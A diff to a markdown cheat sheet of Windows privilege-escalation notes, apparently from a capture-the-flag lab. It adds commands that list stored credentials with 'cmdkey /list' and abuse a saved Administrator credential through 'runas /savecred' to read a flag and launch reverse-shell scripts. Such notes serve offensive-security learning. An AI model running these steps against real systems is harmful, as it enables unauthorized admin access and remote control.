@@ -9,7 +9,11 @@ systeminfo
 
 ipconfig
 
-net start (running services)
+# display running services
+net start
+
+# display stored user names and passwords or credentials.
+cmdkey /list
 ```
 
 ## Usefull CMD commands
@@ -25,6 +29,27 @@ icacls <filename>
 
 # Change text file contents
 echo <new content> > <filename>
+```
+
+### saved creds
+A useful command to run when beginning enumeration is "cmdkey /list", which displays stored
+user names and passwords or credentials. This reveals a stored credential for
+"ACCESS\Administrator".
+```
+PS C:\Users> cmdkey /list
+Currently stored credentials:
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+```
+Let's abuse it to run our own command as admin
+```
+# Read flag
+PS C:\Users> runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\root.txt"
+
+# Launch estalated revshell
+runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\Desktop\revshell.ps1"
+runas /user:ACCESS\Administrator /savecred c:\users\security\revshell.bat
 ```
 
 ## Metasploit
